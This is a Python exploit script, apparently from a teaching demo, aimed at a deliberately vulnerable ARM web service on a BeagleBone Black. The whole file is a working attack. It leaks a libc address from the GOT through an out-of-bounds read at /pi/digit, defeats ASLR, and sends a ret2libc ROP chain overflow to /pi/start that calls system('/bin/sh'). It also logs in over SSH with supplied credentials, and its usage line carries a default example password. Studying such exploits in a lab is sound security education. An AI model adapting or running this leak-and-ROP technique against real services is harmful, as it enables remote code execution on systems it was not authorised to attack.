#!/usr/bin/env python3
"""
aslr_bypass.py — ret2libc exploit against /pi/start with ASLR defeat

Leaks a runtime libc address from the GOT using the out-of-bounds read
primitive in GET /pi/digit?n=<int>, then computes all ROP addresses
dynamically.  Works with ASLR enabled (randomize_va_space = 2).

Static values derived from the BBB binary and its libc (computed once):

  Binary (rop-webservice, non-PIE — addresses are fixed):
    g_pi_calc       0x00026d10  (.bss)
    m_digits offset +0x10 within g_pi_calc  →  M_DIGITS = 0x00026d20
    snprintf@GOT    0x00026c64  (.got)
    DELTA           0x26c64 − 0x26d20 = −188

  OOB read formula (digit_at uses n−1 as index):
    n = DELTA + i + 1  for byte i of the GOT entry (i = 0..3)
    → n values: −187, −186, −185, −184

  libc-2.19.so offsets (readelf -s / strings -t x):
    snprintf  0x38e3d  (Thumb, bit0=1 — GOT stores this value verbatim)
    system()  0x2e211  (Thumb, bit0=1)
    /bin/sh   0xcd660
    gadget    0x59cfc  pop {r0, r4, pc}  (ARM mode, bit0=0)

Exploit flow:
  1. SSH to BBB — verify ASLR is enabled; abort if it is not
  2. GET /pi/status         — liveness check; resolves snprintf in the GOT
  3. GET /pi/digit?n=<n> ×4 — leak 4 bytes of snprintf@GOT
  4. libc_base = leaked − SNPRINTF_OFF
  5. POST /pi/start         — overflow with dynamically computed ROP chain
"""

import sys, os

VENV = os.path.join(os.path.dirname(__file__), '..', 'exploit-env',
                    'lib', 'python3.12', 'site-packages')
sys.path.insert(0, VENV)

import struct, requests, paramiko
from urllib.parse import urlparse


def parse_target(raw: str) -> str:
    try:
        p = urlparse(raw)
        port = p.port
    except ValueError as e:
        sys.exit(f'[-] Invalid TARGET URL: {e}')
    if p.scheme not in ('http', 'https'):
        sys.exit(f'[-] TARGET must start with http:// or https://  (got: {raw!r})')
    if not p.hostname:
        sys.exit(f'[-] TARGET has no host: {raw!r}')
    return raw.rstrip('/')


if len(sys.argv) != 4:
    prog = os.path.basename(sys.argv[0])
    sys.exit(
        f'Usage: {prog} <target-url> <ssh-user> <ssh-password>\n'
        f'  e.g. {prog} http://192.168.7.2:8080 embed temppwd'
    )

TARGET   = parse_target(sys.argv[1])
SSH_USER = sys.argv[2]
SSH_PASS = sys.argv[3]
SSH_HOST = urlparse(sys.argv[1]).hostname

# ---------------------------------------------------------------------------
# Static constants — fixed for this binary / libc version regardless of ASLR
# ---------------------------------------------------------------------------

# GOT slot to leak.  snprintf is called by every response handler, so its GOT
# slot is guaranteed resolved after the /pi/status liveness probe below.
M_DIGITS_ADDR = 0x00026d20   # g_pi_calc (0x26d10) + 16 (offset of m_digits)
SNPRINTF_GOT  = 0x00026c64   # readelf -r rop-webservice-bbb | grep snprintf
DELTA         = SNPRINTF_GOT - M_DIGITS_ADDR   # -188

# Libc-2.19.so offsets (readelf -s libc-bbb.so / strings -t x libc-bbb.so)
SNPRINTF_OFF  = 0x38e3d   # Thumb symbol value — GOT entry stores this verbatim
SYSTEM_OFF    = 0x2e211   # Thumb symbol value (bit0=1)
BINSH_OFF     = 0xcd660
GADGET_OFF    = 0x59cfc   # pop {r0, r4, pc} — ARM mode, bit0=0

# Stack overflow offset: config_buf at r7+8, saved LR at r7+100 → 92 bytes
OVERFLOW_OFFSET = 92


BANNER = """
╔══════════════════════════════════════════════════════════════════╗
║        aslr_bypass.py — ARM32 ret2libc with live ASLR defeat    ║
╠══════════════════════════════════════════════════════════════════╣
║  Leaks a runtime libc address from the GOT via the OOB-read     ║
║  primitive in GET /pi/digit, then computes all ROP addresses     ║
║  dynamically.  Works with ASLR enabled (randomize_va_space=2).  ║
╠══════════════════════════════════════════════════════════════════╣
║  Prerequisites                                                   ║
║                                                                  ║
║  1. BBB reachable from this machine (USB or Ethernet)            ║
║  2. Terminal A — service running interactively on the BBB:       ║
║       ssh <user>@<bbb-ip>                                        ║
║       cd ~/rop-vuln-webservice && ./rop-webservice               ║
║  3. Terminal B — run this script from the repo root:             ║
║       source exploit-env/bin/activate                            ║
║       python3 demos/aslr_bypass.py http://<bbb-ip>:8080 \\      ║
║                                     <ssh-user> <ssh-password>   ║
║                                                                  ║
║  The shell appears in Terminal A (the BBB SSH session).          ║
╚══════════════════════════════════════════════════════════════════╝
"""


def check_aslr(host: str, user: str, password: str) -> int:
    """SSH to the BBB and return the current randomize_va_space value."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=user, password=password, timeout=10)
        _, stdout, _ = client.exec_command(
            'cat /proc/sys/kernel/randomize_va_space'
        )
        return int(stdout.read().strip())
    finally:
        client.close()


def leak_byte(n: int) -> int:
    """Read one byte from the service via the /pi/digit OOB primitive."""
    r = requests.get(f'{TARGET}/pi/digit', params={'n': n}, timeout=5)
    return r.json()['digit']


def leak_got_entry() -> int:
    """Leak the 4-byte snprintf@GOT slot as a little-endian integer.

    digit_at(n−1) reads m_digits[n−1].  To read m_digits[DELTA+i] (which
    maps to snprintf@GOT byte i), we pass n = DELTA + i + 1.
    """
    raw = bytes(leak_byte(DELTA + i + 1) for i in range(4))
    return struct.unpack('<I', raw)[0]


def build_payload(gadget: int, binsh: int, system: int) -> bytes:
    payload  = b'A' * OVERFLOW_OFFSET
    payload += struct.pack('<I', gadget)   # saved LR → ARM gadget (bit0=0)
    payload += struct.pack('<I', binsh)    # gadget pops into r0 ("/bin/sh")
    payload += b'JUNK'                    # gadget pops into r4 (discarded)
    payload += struct.pack('<I', system)  # gadget pops into pc → system()
    return payload


def main():
    print(BANNER)

    # Step 1: verify ASLR is enabled on the BBB before proceeding
    print(f'[*] Checking ASLR on {SSH_HOST} via SSH ({SSH_USER}) …')
    try:
        aslr = check_aslr(SSH_HOST, SSH_USER, SSH_PASS)
    except Exception as e:
        sys.exit(f'[-] SSH connection failed: {e}')

    if aslr == 0:
        sys.exit(
            f'[-] ASLR is DISABLED (randomize_va_space=0) on the target.\n'
            f'[-] This script is for ASLR-enabled targets.  Re-enable with:\n'
            f'[-]   echo 2 | sudo tee /proc/sys/kernel/randomize_va_space'
        )
    print(f'[+] ASLR confirmed enabled (randomize_va_space={aslr})')

    # Step 2: liveness check — also resolves snprintf in the GOT via a real
    # response, so the slot is ready to leak on the next request.
    try:
        r = requests.get(f'{TARGET}/pi/status', timeout=3)
        print(f'[+] Service alive: {r.json()}')
    except Exception as e:
        sys.exit(f'[-] Service not responding: {e}')

    # Step 3: leak snprintf@GOT
    n_vals = [DELTA + i + 1 for i in range(4)]
    print(f'\n[*] Leaking snprintf@GOT via /pi/digit  (n = {n_vals})')
    leaked = leak_got_entry()
    print(f'[+] snprintf runtime address : 0x{leaked:08x}')

    # Sanity check: libc base must be page-aligned on ARM32
    libc_base = leaked - SNPRINTF_OFF
    if libc_base & 0xfff:
        sys.exit(
            f'[-] libc base 0x{libc_base:08x} is not page-aligned — '
            f'GOT entry may not yet be resolved'
        )

    # Step 4: compute all ROP addresses from the live libc base
    gadget = libc_base + GADGET_OFF
    binsh  = libc_base + BINSH_OFF
    system = libc_base + SYSTEM_OFF

    print(f'[+] libc base    : 0x{libc_base:08x}')
    print(f'[+] gadget       : 0x{gadget:08x}  (libc+0x{GADGET_OFF:05x}, ARM, bit0=0)')
    print(f'[+] "/bin/sh"    : 0x{binsh:08x}  (libc+0x{BINSH_OFF:05x})')
    print(f'[+] system()     : 0x{system:08x}  (libc+0x{SYSTEM_OFF:05x}, Thumb)')

    # Step 5: build and send the overflow
    payload = build_payload(gadget, binsh, system)
    print(f'\n[*] ROP chain ({len(payload)} B):')
    print(f'    {"A"*92}  ← 92-byte padding to saved LR')
    print(f'    0x{gadget:08x}  ← pop {{r0, r4, pc}} → ARM mode')
    print(f'    0x{binsh:08x}  ← "/bin/sh" → r0')
    print(f'    {"JUNK":8}      ← junk → r4')
    print(f'    0x{system:08x}  ← system() → pc, Thumb mode')
    print(f'\n[*] Sending exploit → {TARGET}/pi/start …')
    print(f'[*] Shell will appear in the BBB SSH terminal.')

    try:
        requests.post(f'{TARGET}/pi/start', data=payload, timeout=5)
    except Exception as e:
        print(f'[*] ({type(e).__name__}) — system() is running, shell active on BBB')


if __name__ == '__main__':
    main()
